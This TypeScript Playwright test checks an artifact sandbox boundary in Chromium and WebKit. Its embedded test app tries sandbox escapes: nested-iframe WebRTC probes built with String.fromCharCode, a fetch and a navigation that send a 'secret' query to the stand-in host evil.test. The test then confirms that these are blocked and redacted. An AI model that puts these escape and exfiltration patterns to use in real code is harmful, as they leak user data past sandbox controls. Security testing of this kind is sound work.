import { createRequire } from 'node:module';
import { buildArtifactSrcDoc } from '/Users/koushikk/Documents/projects/visionOS/src/lib/artifactRuntime.ts';
import { buildArtifactBoundarySrcDoc } from '/Users/koushikk/Documents/projects/visionOS/src/lib/artifactFrameBoundary.ts';
const require = createRequire(import.meta.url);
const { chromium, webkit } = require('/Users/koushikk/.cache/codex-runtimes/codex-primary-runtime/dependencies/node/node_modules/playwright');
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const shapeId = 'shape:e2e';
const frameToken = 'frame:e2e';
const appCode = [
  '<main>bridge test</main>',
  '<script>',
  "window.VisionOS.storage.setItem('counter', '1');",
  "const nested = document.createElement('iframe'); window.__nested = nested; document.body.appendChild(nested); nested.srcdoc = String.fromCharCode(60) + '!doctype html><body><script>(async()=>{let pc;try{pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel(String.fromCharCode(112,114,111,98,101));await pc.createOffer();document.body.textContent=String.fromCharCode(82,84,67,95,79,70,70,69,82,95,79,75)}catch(error){document.body.textContent=error.name}finally{try{pc&&pc.close()}catch(error){}}})();' + String.fromCharCode(60) + '/script></body>'; try { const NativePeer = nested.contentWindow.RTCPeerConnection; window.VisionOS.storage.setItem('nestedBlankRTC', typeof NativePeer); if (typeof NativePeer === 'function') { const peer = new NativePeer(); peer.close(); window.VisionOS.storage.setItem('nestedBlankConstruct', 'yes'); } } catch (error) { window.VisionOS.storage.setItem('nestedBlankError', error && error.name || 'error'); }",
  "parent.postMessage({ type: 'VISIONOS_EXTERNAL_LINK', shapeId: 'shape:e2e', frameToken: 'frame:e2e', url: 'https://docs.example.test/help?from=app' }, '*');",
  "parent.postMessage({ type: 'CANVASOS_IFRAME_PINCH_ZOOM', shapeId: 'shape:e2e', frameToken: 'frame:e2e', deltaY: 3, deltaMode: 0, clientX: 15, clientY: 20 }, '*');",
  "try { new window.RTCPeerConnection(); } catch (error) {}",
  "fetch('https://approved.test/data').then((response) => response.text()).then((text) => parent.postMessage({type:'fixture-ok', text}, '*'));",
  "fetch('https://evil.test/private?secret=1').catch(() => {});",
  "setTimeout(() => location.assign('https://evil.test/leave?secret=2'), 1300);",
  '</script>',
].join('\n');
const childSrcDoc = buildArtifactSrcDoc(appCode, shapeId, {}, ['https://approved.test'], frameToken);
const boundarySrcDoc = buildArtifactBoundarySrcDoc({
  childSrcDoc,
  shapeId,
  frameToken,
  origins: ['https://approved.test'],
  allowPeerConnections: false,
});
const boundaryLiteral = JSON.stringify(boundarySrcDoc).replace(/</g, '\\u003c');
const appHtml = [
  '<!doctype html><html><head><title>app without CSP</title></head><body>',
  '<script>',
  'window.__events = []; window.addEventListener("message", (event) => window.__events.push(event.data));',
  'const wrapper = document.createElement("iframe"); wrapper.id = "artifact-wrapper";',
  'wrapper.setAttribute("sandbox", "allow-scripts allow-modals");',
  'wrapper.srcdoc = ' + boundaryLiteral + '; document.body.appendChild(wrapper);',
  '</script></body></html>',
].join('\n');
(async () => {
  const allResults: Record<string, unknown> = {};
  for (const [engine, browserType] of [['chromium', chromium], ['webkit', webkit]] as const) {
    const launchOptions = engine === 'chromium'
      ? { headless: true, executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' }
      : { headless: true };
    const browser = await browserType.launch(launchOptions);
    const context = await browser.newContext();
    const intercepted: string[] = [];
    const requests: string[] = [];
    const errors: string[] = [];
    await context.route('**/*', async (route: any) => {
      const url = route.request().url();
      if (url.startsWith('blob:')) return route.continue();
      intercepted.push(url);
      if (url.startsWith('https://app.test/')) {
        return route.fulfill({ status: 200, contentType: 'text/html', body: appHtml });
      }
      if (url === 'https://approved.test/data') {
        return route.fulfill({ status: 200, contentType: 'text/plain', headers: { 'access-control-allow-origin': '*' }, body: 'fixture-ok' });
      }
      errors.push('unexpected intercepted request: ' + url);
      return route.abort('blockedbyclient');
    });
    const page = await context.newPage();
    page.on('pageerror', (error: Error) => errors.push('page error: ' + String(error))); page.on('console', (message: any) => errors.push('console: ' + message.type() + ' ' + message.text()));
    page.on('request', (request: any) => requests.push(request.url()));
    await page.goto('https://app.test/e2e');
    await page.waitForFunction(() => window.__events?.some((message: any) => message?.type === 'VISIONOS_STORAGE_PENDING'), null, { timeout: 5000 }); await page.waitForTimeout(300);
    await page.evaluate(() => {
      document.getElementById('artifact-wrapper')!.contentWindow!.postMessage({
        type: 'VISIONOS_STORAGE_FLUSH_REQUEST', shapeId: 'shape:e2e', frameToken: 'frame:e2e', requestId: 'flush_e2e',
      }, '*');
    });
    await page.waitForTimeout(2400);
    const events = await page.evaluate(() => window.__events); const frames = await Promise.all(page.frames().map(async (frame: any) => ({ url: frame.url(), content: await frame.evaluate(() => ({ rtc: typeof window.RTCPeerConnection, bodyPrefix: (document.body?.textContent || '').slice(0, 80) })).catch((error: Error) => 'ERROR ' + error.message) })));  
    allResults[engine] = {
      events,
      frames,
      requests,
      intercepted,
      errors,
      expected: {
        storageSync: events.some((message: any) => message?.type === 'VISIONOS_STORAGE_SYNC' && message.storage?.counter === '1'),
        nestedBlankRTC: events.find((message: any) => message?.type === 'VISIONOS_STORAGE_SYNC')?.storage?.nestedBlankRTC,
        flushAck: events.some((message: any) => message?.type === 'VISIONOS_STORAGE_FLUSH_ACK' && message.requestId === 'flush_e2e' && message.storage?.counter === '1'),
        approvedLink: events.some((message: any) => message?.type === 'VISIONOS_EXTERNAL_LINK' && message.url === 'https://docs.example.test/help?from=app'),
        pinch: events.some((message: any) => message?.type === 'CANVASOS_IFRAME_PINCH_ZOOM'),
        rtc: events.some((message: any) => message?.type === 'VISIONOS_FEATURE_BLOCKED' && message.feature === 'peer-to-peer'),
        approvedFetch: requests.includes('https://approved.test/data'),
        networkHintRedacted: events.some((message: any) => message?.type === 'VISIONOS_NETWORK_BLOCKED' && message.url === 'https://evil.test' && !JSON.stringify(message).includes('secret')),
        blockedNavigation: events.some((message: any) => message?.type === 'VISIONOS_NAVIGATION_BLOCKED' && !JSON.stringify(message).includes('evil.test')),
        noEvilRequest: !intercepted.some((url) => url.includes('evil.test')),
      },
    };
    await browser.close();
  }
  process.stdout.write(JSON.stringify(allResults, null, 2));
})().catch((error) => { console.error(error); process.exitCode = 1; });
